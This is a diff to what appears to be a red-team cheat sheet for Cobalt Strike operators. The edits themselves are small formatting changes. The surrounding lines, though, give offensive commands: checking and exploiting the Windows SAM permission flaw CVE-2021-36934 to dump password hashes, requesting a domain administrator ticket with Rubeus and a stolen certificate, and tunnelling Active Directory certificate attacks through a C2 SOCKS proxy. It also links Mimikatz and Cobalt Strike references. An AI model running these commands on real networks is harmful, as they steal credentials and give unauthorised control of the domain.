@@ -199,7 +199,7 @@ Exploit in Windows 10 and 11 which allows you to read the SAM, SYSTEM and SECURI
 run icacls C:\Windows\System32\config\SAM
 --> If the results show success and the group BUILTIN\Users has privileges (I)(RX) then the SAM file should be readable by all users! 
 
-# Exploit: Csharp implementation [HERE](https://github.com/cube0x0/CVE-2021-36934)
+# Exploit: Csharp implementation (https://github.com/cube0x0/CVE-2021-36934)
 execute-assembly C:\CVE-2021-36934.exe
 --> Dumps hashes to console upon successful exploitation
 ```
@@ -508,7 +508,7 @@ execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Tem
 Use Python through a SOCKS proxy or a Linux VM on the domain to find and exploit misconfigured AD CS certs<br />
 ```
 # First, start a SOCKS proxy in Cobalt Strike (or skip to the next step if you have an on-site Linux VM)
-socks <port>
+socks <port> socks5
 
 # Configure proxychains on Kali/Linux VM to proxy traffic through C2
 
@@ -708,5 +708,4 @@ bofnet_executeassembly AssemblyName argument1 argument2
 [Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md) 
 
 [SpectreOps Cobalt Strike command reference](https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf) 
-
 
